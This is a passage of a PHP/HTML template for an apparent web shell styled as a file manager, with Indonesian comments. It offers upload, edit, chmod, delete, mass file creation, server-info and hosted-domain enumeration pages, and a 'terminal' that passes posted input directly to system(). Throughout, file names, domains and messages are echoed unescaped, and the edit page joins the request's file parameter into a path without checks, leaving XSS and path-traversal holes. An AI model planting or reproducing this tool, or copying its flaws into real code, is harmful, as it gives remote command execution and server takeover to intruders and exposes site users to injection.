        <!-- Top Bar dengan Navigasi dan Upload -->
        <div class="top-bar">
            <!-- Navigasi Section -->
            <div class="nav-section">
                <!-- Server Info Dropdown -->
                <div class="dropdown-container">
                    <button class="btn" onclick="toggleDropdown('serverInfoDropdown')">
                        <i class="fas fa-server"></i> SERVER INFO
                    </button>
                    <div id="serverInfoDropdown" class="dropdown-content">
                        <div class="server-info-grid">
                            <?php
                            $server_info = getServerInfo();
                            $count = 0;
                            foreach($server_info as $label => $value):
                                if($count++ >= 8) break; // Show only first 8 items in dropdown
                            ?>
                                <div class="server-info-item">
                                    <span class="server-info-label"><?php echo $label; ?></span>
                                    <span class="server-info-value"><?php echo $value; ?></span>
                                </div>
                            <?php endforeach; ?>
                            <div class="form-actions" style="margin-top: 10px; justify-content: center;">
                                <a href="?page=server_info" class="btn">VIEW FULL INFO</a>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Tools Dropdown -->
                <div class="dropdown-container">
                    <button class="btn" onclick="toggleDropdown('toolsDropdown')">
                        <i class="fas fa-tools"></i> TOOLS
                    </button>
                    <div id="toolsDropdown" class="dropdown-content">
                        <div class="tools-grid">
                            <a href="?page=filemanager" class="tool-item">
                                <i class="fas fa-file"></i> FILE MANAGER
                            </a>
                            
                            <?php if(isActionAllowed('mass-create')): ?>
                            <a href="?page=mass_create" class="tool-item">
                                <i class="fas fa-folder-plus"></i> MASS CREATE
                            </a>
                            <?php endif; ?>
                            
                            <a href="?page=malware_scanner" class="tool-item">
                                <i class="fas fa-shield-alt"></i> MALWARE SCANNER
                            </a>
                            
                            <a href="?page=domain_list" class="tool-item">
                                <i class="fas fa-globe"></i> DOMAIN LIST
                            </a>
                            
                            <?php if(isActionAllowed('terminal')): ?>
                            <a href="?page=terminal" class="tool-item">
                                <i class="fas fa-terminal"></i> TERMINAL
                            </a>
                            <?php endif; ?>
                            
                            <a href="?page=dashboard" class="tool-item">
                                <i class="fas fa-tachometer-alt"></i> DASHBOARD
                            </a>
                        </div>
                    </div>
                </div>

                <!-- Logout Button -->
                <a href="?logout" class="btn" style="background: #ff4444; border-color: #ff4444; color: #fff;">
                    <i class="fas fa-sign-out-alt"></i> LOGOUT
                </a>
            </div>
            
            <!-- Upload Form Section -->
            <?php if(isActionAllowed('upload') && $page === 'filemanager'): ?>
            <div class="upload-form">
                <form action="" method="post" enctype="multipart/form-data" style="display: flex; gap: 10px; align-items: center;">
                    <input type="file" name="files[]" multiple required>
                    <button type="submit" class="btn" style="background: #00ff00; color: #000;">
                        <i class="fas fa-upload"></i> UPLOAD
                    </button>
                </form>
            </div>
            <?php endif; ?>
        </div>
        
        <!-- Current Path -->
        <div class="current-path">
            <div class="path-breadcrumb">
                <strong>PATH:</strong>
                <?php
                $path_parts = explode(DIRECTORY_SEPARATOR, $current_path);
                $current_path_build = '';
                foreach($path_parts as $part) {
                    if(empty($part)) continue;
                    $current_path_build .= DIRECTORY_SEPARATOR . $part;
                    echo '<div class="path-segment">';
                    echo '<a href="?path=' . urlencode($current_path_build) . '">' . $part . '</a>';
                    echo '<span>/</span>';
                    echo '</div>';
                }
                ?>
            </div>
            <button class="home-btn" onclick="goHome()">
                <i class="fas fa-home"></i> HOME
            </button>
        </div>

        <!-- Page Content -->
        <?php if($page === 'filemanager'): ?>
            <!-- File Manager Content -->
            <table class="csv-table">
                <thead>
                    <tr>
                        <th>NAME</th>
                        <th>TYPE</th>
                        <th>SIZE</th>
                        <th>PERMISSIONS</th>
                        <th>MODIFIED</th>
                        <th>ACTIONS</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if(empty($directories) && empty($files)): ?>
                        <tr>
                            <td colspan="6" class="empty-state">
                                <i class="fas fa-folder-open"></i>
                                <h3>DIRECTORY IS EMPTY</h3>
                                <p>UPLOAD FILES OR CREATE NEW DIRECTORIES TO GET STARTED</p>
                            </td>
                        </tr>
                    <?php else: ?>
                        <?php foreach($directories as $dir): ?>
                            <tr>
                                <td>
                                    <a href="?path=<?php echo urlencode($current_path . DIRECTORY_SEPARATOR . $dir['name']); ?>" class="dir">
                                        <i class="fas fa-folder"></i>
                                        <?php echo $dir['name']; ?>
                                    </a>
                                </td>
                                <td>DIRECTORY</td>
                                <td><?php echo $dir['size']; ?></td>
                                <td><span class="permission"><?php echo $dir['perms']; ?></span></td>
                                <td><?php echo $dir['modified']; ?></td>
                                <td>
                                    <div class="file-actions">
                                        <button class="file-action" onclick="showActionPopup(this, '<?php echo $dir['name']; ?>', 'dir')">
                                            <i class="fas fa-cog"></i> ACTIONS
                                        </button>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                        
                        <?php foreach($files as $file): ?>
                            <tr>
                                <td>
                                    <?php if(isActionAllowed('edit')): ?>
                                    <a href="?page=edit&file=<?php echo urlencode($file['name']); ?>&path=<?php echo urlencode($current_path); ?>" class="file">
                                        <i class="fas fa-file"></i>
                                        <?php echo $file['name']; ?>
                                    </a>
                                    <?php else: ?>
                                    <span class="file">
                                        <i class="fas fa-file"></i>
                                        <?php echo $file['name']; ?>
                                    </span>
                                    <?php endif; ?>
                                </td>
                                <td>FILE</td>
                                <td><?php echo $file['size']; ?></td>
                                <td><span class="permission"><?php echo $file['perms']; ?></span></td>
                                <td><?php echo $file['modified']; ?></td>
                                <td>
                                    <div class="file-actions">
                                        <button class="file-action" onclick="showActionPopup(this, '<?php echo $file['name']; ?>', 'file')">
                                            <i class="fas fa-cog"></i> ACTIONS
                                        </button>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>

        <?php elseif($page === 'server_info'): ?>
            <!-- Server Info Page -->
            <div class="page-content">
                <h2><i class="fas fa-server"></i> SERVER INFORMATION</h2>
                <div class="server-info-grid">
                    <?php
                    $server_info = getServerInfo();
                    foreach($server_info as $label => $value):
                    ?>
                        <div class="server-info-item">
                            <span class="server-info-label"><?php echo $label; ?></span>
                            <span class="server-info-value"><?php echo $value; ?></span>
                        </div>
                    <?php endforeach; ?>
                </div>
                <div class="form-actions">
                    <a href="?page=filemanager" class="btn">BACK TO FILE MANAGER</a>
                </div>
            </div>

        <?php elseif($page === 'mass_create'): ?>
            <!-- Mass Create Page -->
            <div class="page-content">
                <h2><i class="fas fa-folder-plus"></i> MASS CREATE FILES/DIRECTORIES</h2>
                <form action="" method="post">
                    <div class="form-group">
                        <label for="base_path">BASE PATH (WHERE TO START CREATION):</label>
                        <input type="text" name="base_path" id="base_path" value="<?php echo $current_path; ?>">
                    </div>
                    <div class="form-group">
                        <label for="items">FILES/DIRECTORIES (ONE PER LINE):</label>
                        <textarea name="items" id="items" placeholder="e.g.:&#10;dir1&#10;dir1/file1.txt&#10;dir2/subdir/file2.php"></textarea>
                    </div>
                    <div class="form-group">
                        <label for="file_content">DEFAULT FILE CONTENT (FOR FILES):</label>
                        <textarea name="file_content" id="file_content" placeholder="CONTENT TO PUT IN CREATED FILES"></textarea>
                    </div>
                    <div class="form-actions">
                        <a href="?page=filemanager" class="btn">CANCEL</a>
                        <button type="submit" name="mass_create" class="btn">CREATE FILES & DIRECTORIES</button>
                    </div>
                </form>
            </div>

        <?php elseif($page === 'malware_scanner'): ?>
            <!-- Malware Scanner Page -->
            <div class="page-content">
                <h2><i class="fas fa-shield-alt"></i> MALWARE SCANNER</h2>
                <p>SCANNING FOR COMMON MALWARE PATTERNS AND WEBSHELLS.</p>
                <form action="" method="get">
                    <input type="hidden" name="page" value="malware_scanner">
                    <div class="form-group">
                        <label for="scan_path">PATH TO SCAN:</label>
                        <input type="text" name="scan_path" id="scan_path" value="<?php echo $current_path; ?>">
                    </div>
                    <div class="form-actions">
                        <button type="submit" class="btn">START SCAN</button>
                    </div>
                </form>
                
                <?php
                if(isset($_GET['scan_path'])) {
                    $scan_path = $_GET['scan_path'];
                    if(is_dir($scan_path)) {
                        $results = scanForMalware($scan_path);
                        if(count($results) > 0) {
                            echo '<div style="margin-top: 15px;">';
                            echo '<h3 style="color: #ff4444;"><i class="fas fa-exclamation-triangle"></i> POTENTIAL MALWARE FOUND:</h3>';
                            foreach($results as $result) {
                                echo '<div style="background: #222; padding: 8px; margin-bottom: 8px; border-radius: 5px; border-left: 4px solid #ff4444;">';
                                echo '<strong>FILE:</strong> ' . $result['file'] . '<br>';
                                echo '<strong>PATTERN:</strong> ' . htmlspecialchars($result['pattern']);
                                echo '</div>';
                            }
                            echo '</div>';
                        } else {
                            echo '<div class="empty-state">';
                            echo '<i class="fas fa-check-circle" style="color: #00ff00;"></i>';
                            echo '<h3>NO MALWARE DETECTED</h3>';
                            echo '<p>NO SUSPICIOUS PATTERNS WERE FOUND IN THE SCANNED FILES.</p>';
                            echo '</div>';
                        }
                    } else {
                        echo '<p style="color: #ff4444;">INVALID PATH SPECIFIED.</p>';
                    }
                }
                ?>
                <div class="form-actions">
                    <a href="?page=filemanager" class="btn">BACK TO FILE MANAGER</a>
                </div>
            </div>

        <?php elseif($page === 'domain_list'): ?>
            <!-- Domain List Page -->
            <div class="page-content">
                <h2><i class="fas fa-globe"></i> DOMAIN LIST</h2>
                <p>LIST OF DOMAINS FOUND ON THIS SERVER:</p>
                <div style="background: #222; padding: 15px; border-radius: 5px; margin-top: 15px; max-height: 350px; overflow-y: auto;">
                    <?php
                    $domains = getDomainList();
                    if(count($domains) > 0) {
                        foreach($domains as $domain) {
                            echo '<div style="padding: 8px 0; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center;">';
                            echo '<span><i class="fas fa-server"></i> ' . $domain . '</span>';
                            echo '<button class="file-action" onclick="copyText(\'' . $domain . '\')">COPY</button>';
                            echo '</div>';
                        }
                        echo '<div class="form-actions" style="margin-top: 12px;">';
                        echo '<button class="btn" onclick="copyDomainList()">COPY ALL DOMAINS</button>';
                        echo '</div>';
                    } else {
                        echo '<div class="empty-state">';
                        echo '<i class="fas fa-search"></i>';
                        echo '<h3>NO DOMAINS FOUND</h3>';
                        echo '<p>NO DOMAIN CONFIGURATIONS WERE DETECTED ON THIS SERVER.</p>';
                        echo '</div>';
                    }
                    ?>
                </div>
                <div class="form-actions">
                    <a href="?page=filemanager" class="btn">BACK TO FILE MANAGER</a>
                </div>
            </div>

        <?php elseif($page === 'terminal'): ?>
            <!-- Terminal Page -->
            <div class="page-content">
                <h2><i class="fas fa-terminal"></i> TERMINAL</h2>
                <div style="background: #000; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; height: 350px; overflow-y: auto; white-space: pre-wrap;" id="terminal-output">
                    <?php
                    if(isset($_POST['command'])) {
                        $command = $_POST['command'];
                        echo "> " . htmlspecialchars($command) . "\n";
                        system($command . " 2>&1");
                    }
                    ?>
                </div>
                <form action="" method="post" style="display: flex; margin-top: 12px; gap: 8px;">
                    <input type="text" name="command" placeholder="ENTER COMMAND..." autocomplete="off" style="flex-grow: 1; padding: 8px; background: #222; border: 1px solid #00ff00; border-radius: 5px; color: #fff;">
                    <button type="submit" class="btn">EXECUTE</button>
                </form>
                <div class="form-actions">
                    <a href="?page=filemanager" class="btn">BACK TO FILE MANAGER</a>
                </div>
            </div>

        <?php elseif($page === 'dashboard'): ?>
            <!-- Dashboard Page -->
            <div class="page-content">
                <h2><i class="fas fa-tachometer-alt"></i> DASHBOARD</h2>
                
                <div class="dashboard-container">
                    <div class="server-info-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px;">
                        <div class="server-info-item" style="flex-direction: column; align-items: flex-start; border-bottom: none; padding: 0;">
                            <div class="server-info-label">USER INFORMATION</div>
                            <div class="server-info-value" style="text-align: left; margin-top: 8px;">
                                <strong>USERNAME:</strong> <?php echo $_SESSION['user']; ?><br>
                                <strong>ROLE:</strong> <?php echo $current_user['role']; ?><br>
                                <strong>ALLOWED ROOT:</strong> <?php echo $current_user['max_root']; ?><br>
                                <strong>LOGIN TIME:</strong> <?php echo date('Y-m-d H:i:s', $_SESSION['login_time']); ?>
                            </div>
                        </div>
                        
                        <div class="server-info-item" style="flex-direction: column; align-items: flex-start; border-bottom: none; padding: 0;">
                            <div class="server-info-label">SYSTEM INFORMATION</div>
                            <div class="server-info-value" style="text-align: left; margin-top: 8px;">
                                <strong>SERVER IP:</strong> <?php echo $_SERVER['SERVER_ADDR'] ?? 'N/A'; ?><br>
                                <strong>YOUR IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?><br>
                                <strong>SERVER SOFTWARE:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
                                <strong>PHP VERSION:</strong> <?php echo phpversion(); ?>
                            </div>
                        </div>
                        
                        <div class="server-info-item" style="flex-direction: column; align-items: flex-start; border-bottom: none; padding: 0;">
                            <div class="server-info-label">DIRECTORY INFORMATION</div>
                            <div class="server-info-value" style="text-align: left; margin-top: 8px;">
                                <strong>CURRENT PATH:</strong> <?php echo $current_path; ?><br>
                                <strong>ITEMS IN DIRECTORY:</strong> <?php echo count($files) + count($directories); ?><br>
                                <strong>DISK FREE SPACE:</strong> <?php echo formatSize(disk_free_space("/")); ?><br>
                                <strong>MEMORY USAGE:</strong> <?php echo formatSize(memory_get_usage(true)); ?>
                            </div>
                        </div>
                    </div>
                    
                    <?php if($current_user['role'] === 'superadmin'): ?>
                    <div class="admin-settings">
                        <h3><i class="fas fa-cogs"></i> USER PRIVILEGE SETTINGS</h3>
                        
                        <?php if(isset($settings_updated)): ?>
                            <div style="background: rgba(0, 255, 0, 0.2); color: #00ff00; padding: 10px; border-radius: 5px; margin-bottom: 15px; border: 1px solid #00ff00;">
                                <i class="fas fa-check-circle"></i> USER SETTINGS UPDATED SUCCESSFULLY!
                            </div>
                        <?php endif; ?>
                        
                        <form method="post">
                            <div class="settings-grid">
                                <div class="setting-item">
                                    <label for="user_max_root">USER MAX ROOT DIRECTORY:</label>
                                    <input type="text" name="user_max_root" id="user_max_root" value="<?php echo $_SESSION['user_settings']['user_max_root']; ?>" required>
                                    <small style="color: #aaa;">MAXIMUM ROOT DIRECTORY THAT REGULAR USERS CAN ACCESS</small>
                                </div>
                                
                                <div class="setting-item">
                                    <label for="user_allowed_file_types">ALLOWED FILE TYPES (COMMA SEPARATED):</label>
                                    <input type="text" name="user_allowed_file_types" id="user_allowed_file_types" value="<?php echo implode(',', $_SESSION['user_settings']['user_allowed_file_types']); ?>" required>
                                    <small style="color: #aaa;">FILE EXTENSIONS THAT REGULAR USERS CAN UPLOAD (USE * FOR ALL FILES)</small>
                                </div>
                                
                                <div class="setting-item">
                                    <label for="user_allowed_actions">ALLOWED ACTIONS (COMMA SEPARATED):</label>
                                    <input type="text" name="user_allowed_actions" id="user_allowed_actions" value="<?php echo implode(',', $_SESSION['user_settings']['user_allowed_actions']); ?>" required>
                                    <small style="color: #aaa;">ACTIONS THAT REGULAR USERS CAN PERFORM (VIEW, DOWNLOAD, UPLOAD, RENAME, EDIT, CHMOD, DELETE, MASS-CREATE, TERMINAL, USE * FOR ALL ACTIONS)</small>
                                </div>
                            </div>
                            
                            <div class="form-actions">
                                <button type="submit" name="update_user_settings" class="btn">UPDATE USER SETTINGS</button>
                            </div>
                        </form>
                    </div>
                    <?php endif; ?>
                    
                    <div class="dashboard-actions">
                        <a href="?page=filemanager" class="btn">BACK TO FILE MANAGER</a>
                    </div>
                </div>
            </div>

        <?php elseif($page === 'edit' && isset($_GET['file']) && isActionAllowed('edit')): ?>
            <!-- Edit File Page -->
            <div class="page-content">
                <h2><i class="fas fa-edit"></i> EDIT FILE: <?php echo htmlspecialchars($_GET['file']); ?></h2>
                <?php
                $file_path = $current_path . DIRECTORY_SEPARATOR . $_GET['file'];
                if(isset($_POST['content'])) {
                    if(file_put_contents($file_path, $_POST['content'])) {
                        echo '<div style="background: rgba(0, 255, 0, 0.2); color: #00ff00; padding: 10px; border-radius: 5px; margin-bottom: 15px; border: 1px solid #00ff00;">';
                        echo '<i class="fas fa-check-circle"></i> FILE SAVED SUCCESSFULLY.';
                        echo '</div>';
                    } else {
                        echo '<div style="background: rgba(255, 0, 0, 0.2); color: #ff4444; padding: 10px; border-radius: 5px; margin-bottom: 15px; border: 1px solid #ff4444;">';
                        echo '<i class="fas fa-exclamation-circle"></i> ERROR SAVING FILE.';
                        echo '</div>';
                    }
                }
                
                if(file_exists($file_path)) {
                    $content = file_get_contents($file_path);
                    ?>
                    <form action="" method="post">
                        <div class="form-group">
                            <textarea name="content" style="height: 450px; font-family: monospace; font-size: 13px; width: 100%;"><?php echo htmlspecialchars($content); ?></textarea>
                        </div>
                        <div class="form-actions">
                            <a href="?page=filemanager&path=<?php echo urlencode($current_path); ?>" class="btn">CANCEL</a>
                            <button type="submit" class="btn">SAVE CHANGES</button>
                        </div>
                    </form>
                    <?php
                } else {
                    echo '<div class="empty-state">';
                    echo '<i class="fas fa-exclamation-circle"></i>';
                    echo '<h3>FILE NOT FOUND</h3>';
                    echo '<p>THE REQUESTED FILE DOES NOT EXIST.</p>';
                    echo '</div>';
                }
                ?>
            </div>
        <?php endif; ?>
    </div>
    
    <!-- Action Popup -->
    <div id="actionPopup" class="action-popup">
        <!-- Content will be filled by JavaScript -->
    </div>
    
    <!-- Toast Notifications -->
    <div id="toastContainer"></div>
    
    <script>
        // Dropdown functionality
        function toggleDropdown(dropdownId) {
            var dropdown = document.getElementById(dropdownId);
            var allDropdowns = document.querySelectorAll('.dropdown-content');
            
            // Close all other dropdowns
            allDropdowns.forEach(function(item) {
                if (item.id !== dropdownId) {
                    item.classList.remove('show');
                }
            });
            
            // Toggle current dropdown
            dropdown.classList.toggle('show');
        }
        
        function hideDropdowns() {
            var allDropdowns = document.querySelectorAll('.dropdown-content');
            allDropdowns.forEach(function(item) {
                item.classList.remove('show');
            });
        }
        
        // Close dropdowns when clicking outside
        document.addEventListener('click', function(event) {
            var dropdowns = document.querySelectorAll('.dropdown-content');
            var dropdownContainers = document.querySelectorAll('.dropdown-container');
            
            var clickedInside = false;
            dropdownContainers.forEach(function(container) {
                if (container.contains(event.target)) {
                    clickedInside = true;
                }
            });
            
            if (!clickedInside) {
                dropdowns.forEach(function(dropdown) {
                    dropdown.classList.remove('show');
                });
            }
        });
        
        // Action popup functionality
        function showActionPopup(button, name, type) {
            // Hide any existing popups
            hideActionPopup();
            
            // Create popup content based on file/directory type and permissions
            let popup = document.getElementById('actionPopup');
            let actions = '';
            
            // Common actions for both files and directories
            if (<?php echo isActionAllowed('download') ? 'true' : 'false'; ?> && type === 'file') {
                actions += `<button onclick="downloadFile('${name}')"><i class="fas fa-download"></i> DOWNLOAD</button>`;
            }
            
            if (<?php echo isActionAllowed('edit') ? 'true' : 'false'; ?> && type === 'file') {
                actions += `<button onclick="editFile('${name}')"><i class="fas fa-edit"></i> EDIT</button>`;
            }
            
            if (<?php echo isActionAllowed('rename') ? 'true' : 'false'; ?>) {
                actions += `<button onclick="renameItem('${name}')"><i class="fas fa-i-cursor"></i> RENAME</button>`;
            }
            
            if (<?php echo isActionAllowed('chmod') ? 'true' : 'false'; ?>) {
                actions += `<button onclick="chmodItem('${name}')"><i class="fas fa-key"></i> CHMOD</button>`;
            }
            
            if (<?php echo isActionAllowed('delete') ? 'true' : 'false'; ?>) {
                actions += `<button class="delete" onclick="deleteItem('${name}')"><i class="fas fa-trash"></i> DELETE</button>`;
            }
            
            popup.innerHTML = actions;
            popup.style.display = 'flex';
            
            // Position the popup near the button
            let rect = button.getBoundingClientRect();
            popup.style.top = (rect.bottom + window.scrollY) + 'px';
            popup.style.left = (rect.left + window.scrollX) + 'px';
            
            // Add event listener to close popup when clicking outside
            setTimeout(() => {
                document.addEventListener('click', hideActionPopupOnClick);
            }, 100);
        }
        
        function hideActionPopup() {
            let popup = document.getElementById('actionPopup');
            popup.style.display = 'none';
            document.removeEventListener('click', hideActionPopupOnClick);
        }
        
        function hideActionPopupOnClick(e) {
            let popup = document.getElementById('actionPopup');
            if (!popup.contains(e.target)) {
                hideActionPopup();
            }
        }
        
        // Action functions
        function downloadFile(name) {
            window.location.href = `?path=<?php echo urlencode($current_path); ?>&download=${encodeURIComponent(name)}`;
            hideActionPopup();
        }
        
        function editFile(name) {
            window.location.href = `?page=edit&file=${encodeURIComponent(name)}&path=<?php echo urlencode($current_path); ?>`;
            hideActionPopup();
        }
        
        function renameItem(name) {
            let newName = prompt('Enter new name:', name);
            if (newName && newName !== name) {
                window.location.href = `?path=<?php echo urlencode($current_path); ?>&rename=${encodeURIComponent(name)}&new_name=${encodeURIComponent(newName)}`;
            }
            hideActionPopup();
        }
        
        function chmodItem(name) {
            let newPerms = prompt('Enter new permissions (octal, e.g., 755):', '644');
            if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) {
                window.location.href = `?path=<?php echo urlencode($current_path); ?>&chmod=${encodeURIComponent(name)}&new_permissions=${encodeURIComponent(newPerms)}`;
            }
            hideActionPopup();
        }
        
        function deleteItem(name) {
            if (confirm(`Are you sure you want to delete "${name}"?`)) {
                window.location.href = `?path=<?php echo urlencode($current_path); ?>&delete=${encodeURIComponent(name)}&confirm=1`;
            }
            hideActionPopup();
        }
        
        function goHome() {
            window.location.href = '?path=<?php echo urlencode($home_path); ?>';
        }
        
        function copyDomainList() {
            <?php
            $domains = getDomainList();
            $domains_js = json_encode($domains);
            ?>
            const domains = <?php echo $domains_js; ?>;
            const text = domains.join('\n');
            copyText(text);
            showToast('All domains copied to clipboard!', 'success');
        }
        
        function copyText(text) {
            navigator.clipboard.writeText(text).then(function() {
                showToast('Copied to clipboard!', 'success');
            }, function(err) {
                // Fallback for older browsers
                const textArea = document.createElement("textarea");
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                showToast('Copied to clipboard!', 'success');
            });
        }
        
        // Toast notification system
        function showToast(message, type = 'info') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
                <span>${message}</span>
            `;
            
            container.appendChild(toast);
            
            // Show toast
            setTimeout(() => {
                toast.classList.add('show');
            }, 100);
            
            // Hide toast after 5 seconds
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => {
                    container.removeChild(toast);
                }, 300);
            }, 5000);
        }
        
        // Scroll terminal to bottom
        const terminalOutput = document.getElementById('terminal-output');
        if(terminalOutput) {
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
        }
        
        // Show action messages as toasts
        <?php if(isset($_SESSION['action_message'])): ?>
            showToast('<?php echo $_SESSION['action_message']['message']; ?>', '<?php echo $_SESSION['action_message']['type']; ?>');
            <?php unset($_SESSION['action_message']); ?>
        <?php endif; ?>
        
        // Add keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Ctrl+H for Home
            if(e.ctrlKey && e.key === 'h') {
                e.preventDefault();
                goHome();
            }
            
            // Escape to close dropdowns
            if(e.key === 'Escape') {
                hideDropdowns();
                hideActionPopup();
            }
        });
    </script>
</body>
</html>
